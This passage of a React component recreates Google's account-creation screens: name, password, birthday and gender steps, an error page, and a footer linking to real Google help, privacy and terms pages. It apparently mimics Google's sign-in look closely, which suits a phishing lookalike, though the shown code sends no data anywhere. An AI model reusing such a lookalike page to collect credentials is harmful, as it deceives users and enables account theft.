                    className="absolute text-[16px] text-[#444746] peer-focus:text-[#0b57d0] duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text"
                  >
                    {t('lastName')}
                  </label>
                </div>
              </div>

              <div className="flex items-center justify-end gap-4 mt-12">
                <button 
                  type="submit" 
                  disabled={loading}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
                >
                  {t('next')}
                </button>
              </div>
            </form>
          ) : step === 'create_personal' ? (
            <form onSubmit={handleCreateAccount} className="flex flex-col h-full">
              <div className="flex-grow">
                <div className="relative mb-6">
                  <input
                    ref={firstNameInputRef}
                    type="text"
                    id="firstName"
                    value={firstName}
                    onChange={(e) => {
                      setFirstName(e.target.value);
                      if (error) setError('');
                    }}
                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="firstName" 
                    className={`absolute text-[16px] ${error ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
                  >
                    {t('firstName')}
                  </label>
                </div>
                
                {error && (
                  <div className="flex items-center gap-2 text-[#b3261e] text-xs -mt-5 mb-4 ml-4">
                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                    </svg>
                    <span>{error}</span>
                  </div>
                )}
                
                <div className="relative mb-6">
                  <input
                    type="text"
                    id="lastName"
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value)}
                    className="block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0] appearance-none focus:outline-none focus:ring-0 peer"
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="lastName" 
                    className="absolute text-[16px] text-[#444746] peer-focus:text-[#0b57d0] duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text"
                  >
                    {t('lastName')}
                  </label>
                </div>

                <div className="relative mb-6">
                  <input
                    type={showPassword ? "text" : "password"}
                    id="newPassword"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0] appearance-none focus:outline-none focus:ring-0 peer"
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="newPassword" 
                    className="absolute text-[16px] text-[#444746] peer-focus:text-[#0b57d0] duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text"
                  >
                    Password
                  </label>
                </div>
              </div>

              <div className="flex items-center justify-end gap-4 mt-12">
                <button 
                  type="submit" 
                  disabled={loading}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
                >
                  {t('next')}
                </button>
              </div>
            </form>
          ) : step === 'basic_info' ? (
            <form onSubmit={handleCreateAccount} className="flex flex-col h-full">
              <div className="flex-grow">
                <div className="flex gap-4 mb-6">
                  <div className="relative flex-1">
                    <select
                      ref={monthInputRef}
                      id="month"
                      value={month}
                      onChange={(e) => {
                        setMonth(e.target.value);
                        if (error) setError('');
                      }}
                      className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error && !month ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                      disabled={loading}
                    >
                      <option value="" disabled hidden></option>
                      <option value="1">{t('january')}</option>
                      <option value="2">{t('february')}</option>
                      <option value="3">{t('march')}</option>
                      <option value="4">{t('april')}</option>
                      <option value="5">{t('may')}</option>
                      <option value="6">{t('june')}</option>
                      <option value="7">{t('july')}</option>
                      <option value="8">{t('august')}</option>
                      <option value="9">{t('september')}</option>
                      <option value="10">{t('october')}</option>
                      <option value="11">{t('november')}</option>
                      <option value="12">{t('december')}</option>
                    </select>
                    <label 
                      htmlFor="month" 
                      className={`absolute text-[16px] ${error && !month ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform ${month ? '-translate-y-7 scale-[0.75]' : 'translate-y-0 scale-100'} top-4 z-10 origin-left left-3 bg-white px-1 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text pointer-events-none`}
                    >
                      {t('month')}
                    </label>
                    <div className="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                      <ChevronDown className="w-5 h-5 text-[#444746]" />
                    </div>
                  </div>
                  
                  <div className="relative flex-1">
                    <input
                      type="text"
                      id="day"
                      value={day}
                      onChange={(e) => {
                        setDay(e.target.value);
                        if (error) setError('');
                      }}
                      className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error && !day ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                      placeholder=" "
                      disabled={loading}
                    />
                    <label 
                      htmlFor="day" 
                      className={`absolute text-[16px] ${error && !day ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
                    >
                      {t('day')}
                    </label>
                  </div>
                  
                  <div className="relative flex-1">
                    <input
                      type="text"
                      id="year"
                      value={year}
                      onChange={(e) => {
                        setYear(e.target.value);
                        if (error) setError('');
                      }}
                      className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error && !year ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                      placeholder=" "
                      disabled={loading}
                    />
                    <label 
                      htmlFor="year" 
                      className={`absolute text-[16px] ${error && !year ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
                    >
                      {t('year')}
                    </label>
                  </div>
                </div>

                <div className="relative mb-2" ref={genderMenuRef}>
                  <div 
                    onClick={() => !loading && setShowGenderMenu(!showGenderMenu)}
                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error && !gender ? 'border-2 border-[#b3261e]' : showGenderMenu ? 'border-2 border-[#0b57d0]' : 'border-[#747775] hover:border-[#1f1f1f]'} cursor-pointer relative`}
                  >
                    <span className={`block ${gender ? 'opacity-100' : 'opacity-0'}`}>
                      {gender === 'female' ? 'Female' : gender === 'male' ? 'Male' : gender === 'rather_not_say' ? 'Rather not say' : gender === 'custom' ? 'Custom' : '\u00A0'}
                    </span>
                    <label 
                      className={`absolute text-[16px] ${error && !gender ? 'text-[#b3261e]' : showGenderMenu ? 'text-[#0b57d0]' : 'text-[#444746]'} duration-200 transform ${gender || showGenderMenu ? '-translate-y-7 scale-[0.75]' : 'translate-y-0 scale-100'} top-4 z-10 origin-left left-3 bg-white px-1 cursor-pointer pointer-events-none`}
                    >
                      {t('gender')}
                    </label>
                    <div className="absolute inset-y-0 right-0 flex items-center px-4 pointer-events-none">
                      {showGenderMenu ? (
                        <svg width="10" height="5" viewBox="0 0 10 5" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M0 5L5 0L10 5H0Z" fill="#0b57d0"/>
                        </svg>
                      ) : (
                        <svg width="10" height="5" viewBox="0 0 10 5" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M0 0L5 5L10 0H0Z" fill="#444746"/>
                        </svg>
                      )}
                    </div>
                  </div>
                  
                  {showGenderMenu && (
                    <div className="absolute top-full left-0 right-0 bg-[#f4f7fc] rounded-b-[4px] shadow-[0_4px_8px_rgba(0,0,0,0.1)] z-50 overflow-hidden py-2 mt-0">
                      {[
                        { value: 'female', label: t('female') },
                        { value: 'male', label: t('male') },
                        { value: 'rather_not_say', label: t('ratherNotSay') },
                        { value: 'custom', label: t('custom') }
                      ].map((option) => (
                        <div
                          key={option.value}
                          onClick={() => {
                            setGender(option.value);
                            setShowGenderMenu(false);
                            if (error) setError('');
                          }}
                          className={`px-4 py-3.5 text-[16px] cursor-pointer ${gender === option.value ? 'bg-[#e0e4e9] text-[#1f1f1f]' : 'text-[#444746] hover:bg-[#e0e4e9]'}`}
                        >
                          {option.label}
                        </div>
                      ))}
                    </div>
                  )}
                </div>
                
                <div className="mt-2">
                  <a href="#" className="text-[#0b57d0] text-sm font-medium hover:underline">
                    Why we ask for your birthday and gender
                  </a>
                </div>

                {error && (
                  <div className="flex items-center gap-2 text-[#b3261e] text-xs mt-4 ml-4">
                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                    </svg>
                    <span>{error}</span>
                  </div>
                )}
              </div>

              <div className="flex items-center justify-end gap-4 mt-12">
                <button 
                  type="submit" 
                  disabled={loading}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
                >
                  {t('next')}
                </button>
              </div>
            </form>
          ) : step === 'something_went_wrong' ? (
            <div className="flex flex-col h-full">
              <div className="flex-grow">
                <div className="text-[14px] text-[#5f6368] mt-2">
                  {error || 'RPC executor service threw an error!'}
                </div>
              </div>
              <div className="flex items-center justify-end gap-4 mt-12">
                <button 
                  onClick={() => setStep('email')}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors flex items-center justify-center min-w-[80px]"
                >
                  {t('next')}
                </button>
              </div>
            </div>
          ) : step === 'no_account' ? (
            <div className="flex flex-col h-full">
              <div className="flex-grow">
                <p className="text-[#5f6368]">No account found with that information.</p>
              </div>
              <div className="flex items-center justify-end gap-4 mt-12">
                <button 
                  type="button" 
                  onClick={() => setStep('forgot_email')}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors flex items-center justify-center min-w-[80px]"
                >
                  {t('tryAgain')}
                </button>
              </div>
            </div>
          ) : null}
        </div>
      </div>

      {/* Footer */}
      <div className="w-full max-w-[1040px] mt-4 flex flex-col sm:flex-row justify-between items-center text-[12px] text-[#444746] px-4">
        <div className="relative" ref={langMenuRef}>
          <button 
            onClick={() => setShowLangMenu(!showLangMenu)}
            className={`flex items-center gap-2 hover:bg-[#e1e5ea] px-2 py-1.5 rounded transition-colors focus:outline-none ${showLangMenu ? 'bg-[#e1e5ea]' : ''}`}
          >
            <span>{language}</span>
            <svg className={`w-4 h-4 transition-transform ${showLangMenu ? 'rotate-180' : ''}`} viewBox="0 0 24 24" fill="currentColor">
              <path d="M7 10l5 5 5-5z" />
            </svg>
          </button>
          
          {showLangMenu && (
            <div className="absolute bottom-full left-0 mb-1 w-[200px] bg-white rounded-[4px] shadow-[0_1px_2px_0_rgba(60,64,67,0.3),0_2px_6px_2px_rgba(60,64,67,0.15)] py-1 z-50 max-h-[300px] overflow-y-auto custom-scrollbar">
              {languages.map(lang => (
                <button 
                  key={lang}
                  onClick={() => {
                    setLanguage(lang);
                    setShowLangMenu(false);
                  }}
                  className={`w-full text-left px-4 py-3 text-[14px] ${language === lang ? 'bg-[#d2e3fc] text-[#1f1f1f]' : 'text-[#444746] hover:bg-[#f1f3f4]'} transition-colors`}
                >
                  {lang}
                </button>
              ))}
            </div>
          )}
        </div>
        <div className="flex gap-6 mt-2 sm:mt-0 items-center">
          <a href="https://support.google.com/accounts?hl=en&visit_id=639086890386384876-1187701519&rd=2&p=account_iph#topic=3382296" target="_blank" rel="noopener noreferrer" className="hover:bg-[#e1e5ea] px-2 py-1 rounded transition-colors">{t('help')}</a>
          <a href="https://policies.google.com/privacy?gl=PH&hl=en-US" target="_blank" rel="noopener noreferrer" className="hover:bg-[#e1e5ea] px-2 py-1 rounded transition-colors">{t('privacy')}</a>
          <a href="https://policies.google.com/terms?gl=PH&hl=en-US" target="_blank" rel="noopener noreferrer" className="hover:bg-[#e1e5ea] px-2 py-1 rounded transition-colors">{t('terms')}</a>
        </div>
      </div>
    </div>
  );
}
